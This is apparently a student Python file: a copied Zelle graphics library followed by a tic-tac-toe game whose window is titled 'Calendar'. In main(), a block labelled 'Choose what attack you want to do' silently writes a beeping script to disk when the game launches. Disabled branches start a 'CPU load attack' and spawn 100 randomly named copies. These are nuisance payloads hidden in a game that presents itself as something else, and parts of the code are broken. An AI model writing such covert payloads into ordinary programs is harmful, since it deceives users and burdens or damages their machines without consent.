
__version__ = "5.0"

import time, os, sys

try:  # import as appropriate for 2.x vs. 3.x
   import tkinter as tk
except:
   import Tkinter as tk


##########################################################################
# Module Exceptions

class GraphicsError(Exception):
    """Generic error class for graphics module exceptions."""
    pass

OBJ_ALREADY_DRAWN = "Object currently drawn"
UNSUPPORTED_METHOD = "Object doesn't support operation"
BAD_OPTION = "Illegal option value"

##########################################################################
# global variables and funtions

_root = tk.Tk()
_root.withdraw()

_update_lasttime = time.time()

def update(rate=None):
    global _update_lasttime
    if rate:
        now = time.time()
        pauseLength = 1/rate-(now-_update_lasttime)
        if pauseLength > 0:
            time.sleep(pauseLength)
            _update_lasttime = now + pauseLength
        else:
            _update_lasttime = now

    _root.update()

############################################################################
# Graphics classes start here
        
class GraphWin(tk.Canvas):

    """A GraphWin is a toplevel window for displaying graphics."""

    def __init__(self, title="Graphics Window",
                 width=200, height=200, autoflush=True):
        assert type(title) == type(""), "Title must be a string"
        master = tk.Toplevel(_root)
        master.protocol("WM_DELETE_WINDOW", self.close)
        tk.Canvas.__init__(self, master, width=width, height=height, highlightthickness=0, bd=0)
        self.master.title(title)
        self.pack()
        master.resizable(0,0)
        self.foreground = "black"
        self.items = []
        self.mouseX = None
        self.mouseY = None
        self.bind("<Button-1>", self._onClick)
        self.bind_all("<Key>", self._onKey)
        self.height = int(height)
        self.width = int(width)
        self.autoflush = autoflush
        self._mouseCallback = None
        self.trans = None
        self.closed = False
        master.lift()
        self.lastKey = ""
        if autoflush: _root.update()

    def __repr__(self):
        if self.isClosed():
            return "<Closed GraphWin>"
        else:
            return "GraphWin('{}', {}, {})".format(self.master.title(),
                                             self.getWidth(),
                                             self.getHeight())

    def __str__(self):
        return repr(self)
     
    def __checkOpen(self):
        if self.closed:
            raise GraphicsError("window is closed")

    def _onKey(self, evnt):
        self.lastKey = evnt.keysym


    def setBackground(self, color):
        """Set background color of the window"""
        self.__checkOpen()
        self.config(bg=color)
        self.__autoflush()
        
    def setCoords(self, x1, y1, x2, y2):
        """Set coordinates of window to run from (x1,y1) in the
        lower-left corner to (x2,y2) in the upper-right corner."""
        self.trans = Transform(self.width, self.height, x1, y1, x2, y2)
        self.redraw()

    def close(self):
        """Close the window"""

        if self.closed: return
        self.closed = True
        self.master.destroy()
        self.__autoflush()


    def isClosed(self):
        return self.closed


    def isOpen(self):
        return not self.closed


    def __autoflush(self):
        if self.autoflush:
            _root.update()

    
    def plot(self, x, y, color="black"):
        """Set pixel (x,y) to the given color"""
        self.__checkOpen()
        xs,ys = self.toScreen(x,y)
        self.create_line(xs,ys,xs+1,ys, fill=color)
        self.__autoflush()
        
    def plotPixel(self, x, y, color="black"):
        """Set pixel raw (independent of window coordinates) pixel
        (x,y) to color"""
        self.__checkOpen()
        self.create_line(x,y,x+1,y, fill=color)
        self.__autoflush()
      
    def flush(self):
        """Update drawing to the window"""
        self.__checkOpen()
        self.update_idletasks()
        
    def getMouse(self):
        """Wait for mouse click and return Point object representing
        the click"""
        self.update()      # flush any prior clicks
        self.mouseX = None
        self.mouseY = None
        while self.mouseX == None or self.mouseY == None:
            self.update()
            if self.isClosed(): raise GraphicsError("getMouse in closed window")
            time.sleep(.1) # give up thread
        x,y = self.toWorld(self.mouseX, self.mouseY)
        self.mouseX = None
        self.mouseY = None
        return Point(x,y)

    def checkMouse(self):
        """Return last mouse click or None if mouse has
        not been clicked since last call"""
        if self.isClosed():
            raise GraphicsError("checkMouse in closed window")
        self.update()
        if self.mouseX != None and self.mouseY != None:
            x,y = self.toWorld(self.mouseX, self.mouseY)
            self.mouseX = None
            self.mouseY = None
            return Point(x,y)
        else:
            return None

    def getKey(self):
        """Wait for user to press a key and return it as a string."""
        self.lastKey = ""
        while self.lastKey == "":
            self.update()
            if self.isClosed(): raise GraphicsError("getKey in closed window")
            time.sleep(.1) # give up thread

        key = self.lastKey
        self.lastKey = ""
        return key

    def checkKey(self):
        """Return last key pressed or None if no key pressed since last call"""
        if self.isClosed():
            raise GraphicsError("checkKey in closed window")
        self.update()
        key = self.lastKey
        self.lastKey = ""
        return key
            
    def getHeight(self):
        """Return the height of the window"""
        return self.height
        
    def getWidth(self):
        """Return the width of the window"""
        return self.width
    
    def toScreen(self, x, y):
        trans = self.trans
        if trans:
            return self.trans.screen(x,y)
        else:
            return x,y
                      
    def toWorld(self, x, y):
        trans = self.trans
        if trans:
            return self.trans.world(x,y)
        else:
            return x,y
        
    def setMouseHandler(self, func):
        self._mouseCallback = func
        
    def _onClick(self, e):
        self.mouseX = e.x
        self.mouseY = e.y
        if self._mouseCallback:
            self._mouseCallback(Point(e.x, e.y))

    def addItem(self, item):
        self.items.append(item)

    def delItem(self, item):
        self.items.remove(item)

    def redraw(self):
        for item in self.items[:]:
            item.undraw()
            item.draw(self)
        self.update()
        
                      
class Transform:

    """Internal class for 2-D coordinate transformations"""
    
    def __init__(self, w, h, xlow, ylow, xhigh, yhigh):
        # w, h are width and height of window
        # (xlow,ylow) coordinates of lower-left [raw (0,h-1)]
        # (xhigh,yhigh) coordinates of upper-right [raw (w-1,0)]
        xspan = (xhigh-xlow)
        yspan = (yhigh-ylow)
        self.xbase = xlow
        self.ybase = yhigh
        self.xscale = xspan/float(w-1)
        self.yscale = yspan/float(h-1)
        
    def screen(self,x,y):
        # Returns x,y in screen (actually window) coordinates
        xs = (x-self.xbase) / self.xscale
        ys = (self.ybase-y) / self.yscale
        return int(xs+0.5),int(ys+0.5)
        
    def world(self,xs,ys):
        # Returns xs,ys in world coordinates
        x = xs*self.xscale + self.xbase
        y = self.ybase - ys*self.yscale
        return x,y


# Default values for various item configuration options. Only a subset of
#   keys may be present in the configuration dictionary for a given item
DEFAULT_CONFIG = {"fill":"",
      "outline":"black",
      "width":"1",
      "arrow":"none",
      "text":"",
      "justify":"center",
                  "font": ("helvetica", 12, "normal")}

class GraphicsObject:

    """Generic base class for all of the drawable objects"""
    # A subclass of GraphicsObject should override _draw and
    #   and _move methods.
    
    def __init__(self, options):
        # options is a list of strings indicating which options are
        # legal for this object.
        
        # When an object is drawn, canvas is set to the GraphWin(canvas)
        #    object where it is drawn and id is the TK identifier of the
        #    drawn shape.
        self.canvas = None
        self.id = None

        # config is the dictionary of configuration options for the widget.
        config = {}
        for option in options:
            config[option] = DEFAULT_CONFIG[option]
        self.config = config
        
    def setFill(self, color):
        """Set interior color to color"""
        self._reconfig("fill", color)
        
    def setOutline(self, color):
        """Set outline color to color"""
        self._reconfig("outline", color)
        
    def setWidth(self, width):
        """Set line weight to width"""
        self._reconfig("width", width)

    def draw(self, graphwin):

        """Draw the object in graphwin, which should be a GraphWin
        object.  A GraphicsObject may only be drawn into one
        window. Raises an error if attempt made to draw an object that
        is already visible."""

        if self.canvas and not self.canvas.isClosed(): raise GraphicsError(OBJ_ALREADY_DRAWN)
        if graphwin.isClosed(): raise GraphicsError("Can't draw to closed window")
        self.canvas = graphwin
        self.id = self._draw(graphwin, self.config)
        graphwin.addItem(self)
        if graphwin.autoflush:
            _root.update()
        return self

            
    def undraw(self):

        """Undraw the object (i.e. hide it). Returns silently if the
        object is not currently drawn."""
        
        if not self.canvas: return
        if not self.canvas.isClosed():
            self.canvas.delete(self.id)
            self.canvas.delItem(self)
            if self.canvas.autoflush:
                _root.update()
        self.canvas = None
        self.id = None


    def move(self, dx, dy):

        """move object dx units in x direction and dy units in y
        direction"""
        
        self._move(dx,dy)
        canvas = self.canvas
        if canvas and not canvas.isClosed():
            trans = canvas.trans
            if trans:
                x = dx/ trans.xscale 
                y = -dy / trans.yscale
            else:
                x = dx
                y = dy
            self.canvas.move(self.id, x, y)
            if canvas.autoflush:
                _root.update()
           
    def _reconfig(self, option, setting):
        # Internal method for changing configuration of the object
        # Raises an error if the option does not exist in the config
        #    dictionary for this object
        if option not in self.config:
            raise GraphicsError(UNSUPPORTED_METHOD)
        options = self.config
        options[option] = setting
        if self.canvas and not self.canvas.isClosed():
            self.canvas.itemconfig(self.id, options)
            if self.canvas.autoflush:
                _root.update()


    def _draw(self, canvas, options):
        """draws appropriate figure on canvas with options provided
        Returns Tk id of item drawn"""
        pass # must override in subclass


    def _move(self, dx, dy):
        """updates internal state of object to move it dx,dy units"""
        pass # must override in subclass

         
class Point(GraphicsObject):
    def __init__(self, x, y):
        GraphicsObject.__init__(self, ["outline", "fill"])
        self.setFill = self.setOutline
        self.x = float(x)
        self.y = float(y)

    def __repr__(self):
        return "Point({}, {})".format(self.x, self.y)
        
    def _draw(self, canvas, options):
        x,y = canvas.toScreen(self.x,self.y)
        return canvas.create_rectangle(x,y,x+1,y+1,options)
        
    def _move(self, dx, dy):
        self.x = self.x + dx
        self.y = self.y + dy
        
    def clone(self):
        other = Point(self.x,self.y)
        other.config = self.config.copy()
        return other
                
    def getX(self): return self.x
    def getY(self): return self.y

class _BBox(GraphicsObject):
    # Internal base class for objects represented by bounding box
    # (opposite corners) Line segment is a degenerate case.
    
    def __init__(self, p1, p2, options=["outline","width","fill"]):
        GraphicsObject.__init__(self, options)
        self.p1 = p1.clone()
        self.p2 = p2.clone()

    def _move(self, dx, dy):
        self.p1.x = self.p1.x + dx
        self.p1.y = self.p1.y + dy
        self.p2.x = self.p2.x + dx
        self.p2.y = self.p2.y  + dy
                
    def getP1(self): return self.p1.clone()

    def getP2(self): return self.p2.clone()
    
    def getCenter(self):
        p1 = self.p1
        p2 = self.p2
        return Point((p1.x+p2.x)/2.0, (p1.y+p2.y)/2.0)

class Oval(_BBox):
    
    def __init__(self, p1, p2):
        _BBox.__init__(self, p1, p2)

    def __repr__(self):
        return "Oval({}, {})".format(str(self.p1), str(self.p2))

        
    def clone(self):
        other = Oval(self.p1, self.p2)
        other.config = self.config.copy()
        return other
   
    def _draw(self, canvas, options):
        p1 = self.p1
        p2 = self.p2
        x1,y1 = canvas.toScreen(p1.x,p1.y)
        x2,y2 = canvas.toScreen(p2.x,p2.y)
        return canvas.create_oval(x1,y1,x2,y2,options)
    
class Circle(Oval):
    
    def __init__(self, center, radius):
        p1 = Point(center.x-radius, center.y-radius)
        p2 = Point(center.x+radius, center.y+radius)
        Oval.__init__(self, p1, p2)
        self.radius = radius

    def __repr__(self):
        return "Circle({}, {})".format(str(self.getCenter()), str(self.radius))
        
    def clone(self):
        other = Circle(self.getCenter(), self.radius)
        other.config = self.config.copy()
        return other
        
    def getRadius(self):
        return self.radius

                  

class Circle(Oval):
    
    def __init__(self, center, radius):
        p1 = Point(center.x-radius, center.y-radius)
        p2 = Point(center.x+radius, center.y+radius)
        Oval.__init__(self, p1, p2)
        self.radius = radius

    def __repr__(self):
        return "Circle({}, {})".format(str(self.getCenter()), str(self.radius))
        
    def clone(self):
        other = Circle(self.getCenter(), self.radius)
        other.config = self.config.copy()
        return other
        
    def getRadius(self):
        return self.radius

                  
class Line(_BBox):
    
    def __init__(self, p1, p2):
        _BBox.__init__(self, p1, p2, ["arrow","fill","width"])
        self.setFill(DEFAULT_CONFIG['outline'])
        self.setOutline = self.setFill

    def __repr__(self):
        return "Line({}, {})".format(str(self.p1), str(self.p2))

    def clone(self):
        other = Line(self.p1, self.p2)
        other.config = self.config.copy()
        return other
  
    def _draw(self, canvas, options):
        p1 = self.p1
        p2 = self.p2
        x1,y1 = canvas.toScreen(p1.x,p1.y)
        x2,y2 = canvas.toScreen(p2.x,p2.y)
        return canvas.create_line(x1,y1,x2,y2,options)
        
    def setArrow(self, option):
        if not option in ["first","last","both","none"]:
            raise GraphicsError(BAD_OPTION)
        self._reconfig("arrow", option)
        






#MacOS fix 2
#tk.Toplevel(_root).destroy()

# MacOS fix 1
update()


#test()

from os import path
def main():
    b = [[0,0,0], [0,0,0], [0,0,0]]
    win = GraphWin("Calendar", 600, 600)
    board(win)

    #Choose what attack you want to do Un comment the attack lines
    #Creates a beep
    if(True):
        #creates a file that will beep
        if((path.exists("drone.py") == False)):
            f = open('drone.py', "w")
            f.write("import winsound\nimport random\ndef beep():\n\twinsound.Beep(random.randint(250, 5000), random.randint(500, 5000))\nbeep()")
            f.close()
        #exec(open("drone.py").read())
    #CPU load Attack
    elif(False):
        if(path.exists("remotecmd.py") == False):
            cmd = "nohup python CPULoadGen.py"
            process = subprocess.Popen(cmd, shell=True)
    #Creates a lot of beeps
    elif(False):
        if((path.exists("m1.py") == False)):
            with open('m1.py') as m1:
                m1.write("import os\nimport os.path\nfrom os import path, write\nimport winsound\nimport random\nimport shutil\n\ndef main():\n    \n    if((path.exists(\"drone.py\") == False)):\n        f = open(\'drone.py\', \"w\")\n        f.write(\"import winsound\nimportrandom\ndef beep():\n\twinsound.Beep(random.randint(250, 5000), random.randint(500, 5000))\nbeep()\")\n        f.close()\n\n\n    #effect the number of time that the drone program will be ran\n    counter = 100\n    \n    for i in range(counter):\n        n = createName()\n        shutil.copy(\"drone.py\", n)\n        #DO NOT uncomment line unless you want the code to beep\n        #exec(open(n).read())\n\ndef createName():\n    alpha = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n    n = random.randint(1,10)\n    s = \"\"\n    for i in range(n):\n        ind = random.randint(0, len(alpha))\n        s += alpha[ind - 1]\n    s += \".py\"\n    return s\n\ndef beep():\n    f = random.randint(250, 5000)\n    frequency = f  # Set Frequency To 2500 Hertz\n    duration = 1000  # Set Duration To 1000 ms == 1 second\n    winsound.Beep(f, 1000)\n\nmain()\n")

    
        
                    

            





    i = 0
    while(i < 9 and w(b)):
        clickPoint = win.getMouse()
        if(i % 2 == 0):
            Xs(win, clickPoint,b)
            print(b)
        else:
            Os(win, clickPoint,b)
            print(b)
        i += 1

    
    
    input("press enter to close")
    

def Os(win, clickPoint,b):
    
    if(clickPoint.getX() <= 200):
        if(clickPoint.getY() <= 200):
            drawO(win, Point(100, 100))
            b[0][0] = 2
        elif(clickPoint.getY() <= 400):
            drawO(win, Point(100, 300))
            b[0][1] = 2
        else:
            drawO(win, Point(100, 500))
            b[0][2] = 2
    elif(clickPoint.getX() <= 400):
        if(clickPoint.getY() <= 200):
            drawO(win, Point(300, 100))
            b[1][0] = 2
        elif(clickPoint.getY() <= 400):
            drawO(win, Point(300, 300))
            b[1][1] = 2
        else:
            drawO(win, Point(300, 500))
            b[1][2] = 2
    else:
        if(clickPoint.getY() <= 200):
            drawO(win, Point(500, 100))
            b[2][0] = 2
        elif(clickPoint.getY() <= 400):
            drawO(win, Point(500, 300))
            b[2][1] = 2
        else:
            drawO(win, Point(500, 500))
            b[2][2] = 2


def Xs(win, clickPoint, b):
   
    if(clickPoint.getX() <= 200):
        if(clickPoint.getY() <= 200):
            drawX(win, Point(100, 100))
            b[0][0] = 1
        elif(clickPoint.getY() <= 400):
            drawX(win, Point(100, 300))
            b[0][1] = 1
        else:
            drawX(win, Point(100, 500))
            b[0][2] = 1
    elif(clickPoint.getX() <= 400):
        if(clickPoint.getY() <= 200):
            drawX(win, Point(300, 100))
            b[1][0] = 1
        elif(clickPoint.getY() <= 400):
            drawX(win, Point(300, 300))
            b[1][1] = 1
        else:
            drawX(win, Point(300, 500))
            b[1][2] = 1
    else:
        if(clickPoint.getY() <= 200):
            drawX(win, Point(500, 100))
            b[2][0] = 1
        elif(clickPoint.getY() <= 400):
            drawX(win, Point(500, 300))
            b[2][1] = 1
        else:
            drawX(win, Point(500, 500))
            b[2][2] = 1


def board(win):
    l = Line(Point(200,600), Point(200, 0))
    l.draw(win)
    l = Line(Point(400,600), Point(400, 0))
    l.draw(win)
    l = Line(Point(600,200), Point(0, 200))
    l.draw(win)
    l = Line(Point(600,400), Point(0, 400))
    l.draw(win)

def drawX(win, click):
    px = click.getX()
    py = click.getY()
    l = Line(Point(px + 40, py + 40), Point(px-40, py - 40))
    l.draw(win)
    l = Line(Point(px - 40, py + 40), Point(px + 40, py - 40))
    l.draw(win)

def drawO(win, click):
    px = click.getX()
    py = click.getY()
    c = Circle(Point(px, py), 40)
    c.draw(win)

def w(b):
    for i in range(len(b)):
        if(b[i][0] == b[i][1] and b[i][1] == b[i][2] and b[i][1] != 0):
            print("F")
            return False
    for i in range(len(b[0])):
        if(b[0][i] == b[1][i] and b[1][i] == b[2][i] and b[1][i] != 0):
            print("F")
            return False
    if(b[0][0] == b[1][1] and b[1][1] == b[2][2] and b[1][1] != 0):
        print("F")
        return False
    if(b[2][0] == b[1][1] and b[1][1] == b[0][2] and b[1][1] != 0):
        print("F")
        return False
    return True


    


main()
